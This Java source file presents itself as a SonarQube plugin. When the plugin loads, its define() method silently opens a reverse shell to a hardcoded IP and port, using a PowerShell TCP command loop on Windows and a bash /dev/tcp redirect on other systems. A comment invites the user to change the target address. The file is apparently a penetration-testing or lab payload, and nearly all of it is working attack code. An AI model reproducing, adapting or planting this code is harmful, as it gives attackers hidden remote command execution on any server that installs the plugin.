import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import static java.util.Arrays.asList;
import org.sonar.api.Plugin;
import org.sonar.api.config.PropertyDefinition;

public class shell implements Plugin {
  @Override
  public void define(Context context) {
	// change these two
    String lhost = "172.16.210.3";
    int lport = 9003;       
    try {
      revshell(lhost, lport);
    }
      catch (Exception e){
    }
  }
  public void revshell(String lhost, int lport) throws Exception {
    String os = System.getProperty("os.name").toLowerCase();
    
    String[] cmd = new String[3];
    if (os.contains("win")) {
    cmd[0] = "powershell";
    cmd[1] = "-c";
    cmd[2] = "$TCPClient = New-Object Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
	} else{
	cmd[0] = "bash";
	cmd[1] = "-c";
	cmd[2] = "'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'";
	}
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  }
}
